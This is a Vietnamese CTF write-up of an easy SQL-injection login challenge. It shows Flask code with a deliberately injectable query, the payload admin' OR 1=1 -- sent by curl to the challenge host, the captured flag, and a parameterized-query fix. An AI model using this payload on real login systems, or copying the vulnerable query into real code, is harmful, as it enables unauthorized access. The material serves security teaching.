---
title: "Baby SQL — SQL Injection cơ bản"
date: 2026-03-30
ctf: "Example CTF 2026"
category: web
difficulty: easy
points: 100
tags: [sql-injection, web, authentication-bypass]
---

Challenge cho chúng ta một trang login đơn giản. Mục tiêu là bypass authentication để lấy flag.

## Reconnaissance

Truy cập URL challenge, ta thấy form login với 2 field: username và password.

Thử login với `admin:admin` → sai.

## Analysis

Xem source code được cung cấp:

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = db.execute(query)
    
    if result:
        return f"Welcome! Flag: {FLAG}"
    else:
        return "Invalid credentials"
```

Rõ ràng có **SQL Injection** vì input được nối trực tiếp vào query string mà không có sanitization.

## Exploitation

### Payload

```
Username: admin' OR 1=1 --
Password: anything
```

### Giải thích

Query trở thành:
```sql
SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anything'
```

- `OR 1=1` luôn đúng → bypass điều kiện WHERE
- `--` comment out phần còn lại → bỏ qua check password

### Thực hiện

```bash
curl -X POST http://challenge.ctf.com/login \
  -d "username=admin' OR 1=1 --&password=x"
```

Response:
```
Welcome! Flag: flag{sql_1nj3ct10n_b4by_st3ps}
```

## Flag

<div class="flag">flag{sql_1nj3ct10n_b4by_st3ps}</div>

## Lessons Learned

1. **Không bao giờ** nối user input trực tiếp vào SQL query
2. Luôn dùng **parameterized queries** (prepared statements)
3. Code an toàn:

```python
# ✅ An toàn — Parameterized query
query = "SELECT * FROM users WHERE username=? AND password=?"
result = db.execute(query, (username, password))
```

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
